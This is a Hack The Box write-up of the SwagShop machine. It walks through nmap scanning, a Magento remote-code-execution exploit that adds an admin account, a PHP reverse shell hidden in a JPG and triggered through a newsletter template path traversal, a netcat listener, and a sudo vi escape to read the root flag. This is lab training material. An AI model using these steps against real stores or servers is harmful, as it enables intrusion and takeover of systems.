	   INFORMATION GATHERING | 
---------------------------------

Every single time we are going to attack a HTB machine we need to scan our target, so as always we use nmap:
(I usually run #nmap -sC -sV [target] because is fast and shows enough information, but in case you want to see the whole
information about the target, or ports that may be open and aren't common you can run #nmap -A [target].

	root@kali:~/Private/Hackthebox/SwagShop# nmap -sC -sV 10.10.10.140
	Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-08 13:01 UTC

So we couldn't find much information about our target machine, since ssh requieres password and its protected (Secure Shell) we need to find 
a vunerability on the WebAppService:

Once we go into the web browser we find that "http://10.10.10.140/" is running a Magento Server, so we will need to focus on that to find the main
directories, vulnerabilities and possible credentials that could be store.

-------------------------------------------
	   I N F O    M A N A G E M E N T  |
-------------------------------------------

Magento has an admin login page, which can be found by googling, or by using dirB, or any directory spider... So this can be our entry point to
exploit the machine.

	root@kali:~/Private/Hackthebox/SwagShop#  searchsploit Magento

	--------------------------------- ----------------------------------------
	Shellcodes: No Result


So we look for some creds vulnerability on searchsploit, metasploit, google... and we find [Magento eCommerce - Remote Code Execution], we can
see at the bottom of the page that the server is running Magento 2014, so this may be vulnerable to this script, so we download it, configure the
script data in order to set our machine target and ports.

		WORKED
		Check http://10.10.10.140/admin with creds admin:admin


It worked!! Let's move on to the admin login page and try to log in with our credentials, once we're in we will see the Admin Control Panel.

Now it's time for some googling lookin for Magento's Admin Control Panel vulnerability and we can find an attack which can cause a reverse
shell by uploading an image.jpg with php code (reverse shell)  into a directory and then via the Newsletter Templates we can preview our image
as php code, here is the info [https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper] you should take a look, was really interesting
and well guided.

So the first step we need to do now is download a php reverse shell code [http://pentestmonkey.net/tools/web-shells/php-reverse-shell]

Once we've downloaded it, we need to modify the code and set our target machine and our target port:

	$ip = '127.0.0.1'; //CHANGE THIS --> Your HTB ip
	$port = 1234;

Now, we need to download some random image and put our code into the image:

	root@kali:~/Private/Hackthebox/SwagShop# cat sock.jpg shell.php > socketimage.jpg

To see if it worked, try to cat the result image, it should look like this:

Now, its time to configure our server to exploit the vulnerability, to do this we need to go to System > Configuration > Developer, and 
activate "Allow Symlinks" for Magento Newsletter templates, allowing us as administrator to access newsletter templates outside of the newsletter
document root.


Steps to follow:

   1 - Upload .php code embedded as .jpg file to the target server 
   2 - Create a template which redirects the execution to our uploaded image
   3 - Set a listener to open the shell we injected


	[ 1 ]

As mentioned before, once we've created the .jpg file with the .php code embedded, we need to go to Newsletter > Newsletter Templates and create a 
new one, to insert the image we will need to create a New Folder and then include our image.

Once we create the template we need to inspect the code in our message to find the path from our image, in my case:
	"http://10.10.10.140/media/wysiwyg/rooting/hsmxmxishere.jpg"

If we go to the url from the uploaded image we should see our image run properly, the code won't be executed yet.


	[ 2 ]

Now it's time to create the template which will execute our code by previewing the result, so we need to create a template as before with this block:
	
	{{block type='core/template' template='../../../../../../*PATH_GOES_HERE*}}
	{{block type='core/template' template='../../../../../../media/wysiwyg/rooting/hsmxmxishere.jpg'}} --> My Result

Since we previously enabled the "Allow Symlinks" option, Magento won't reject this path and we will be able to view the newsletter by clicking on the
"Preview Template" option, loading the template and including any template blocks in the preview page including the malicious file and code, 
interpretending the file as PHP interpreter and not as an image.


	[ 3 ]

Before running our preview we need to set up a listener using our reverseshell port which can be done by netcat:

	root@kali:~/Private/Hackthebox/SwagShop# nc -lvp 1234
	listening on [any] 1234 ...

Now it's time to preview our file and it will open us the shell:

	root@kali:~/Private/Hackthebox/SwagShop# nc -lvp 1234
	listening on [any] 1234 ...
	10.10.10.140: inverse host lookup failed: Unknown host

User flag is already exploited, we just need to find it around our exploited machine:

       R O O T   F L A G  |
--------------------------

To find root's flag we need to exploit some kind of privesc in order to read our flag:

	$: sudo -l
	Matching Defaults entries for www-data on swagshop:
	env_reset, mail_badpass,
	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	User www-data may run the following commands on swagshop:
	(root) NOPASSWD: /usr/bin/vi /var/www/html/*

It seems that we can use vi as root privilege without any password, so we can exploit this vuln to get the privesc we need:

	$ sudo /usr/bin/vi /var/www/html/test.sh 
	Vim: Warning: Output is not to a terminal
	Vim: Warning: Input is not from a terminal
--->    :!cat /root/root.txt  <--- [We inject the code here while the file is been created exploiting the execution]

	E558: Terminal entry not found in terminfo
	'unknown' not known. Available builtin terminals are:
	    builtin_amiga
	    builtin_beos-ansi

	    builtin_debug
	    builtin_dumb
	defaulting to 'ansi'
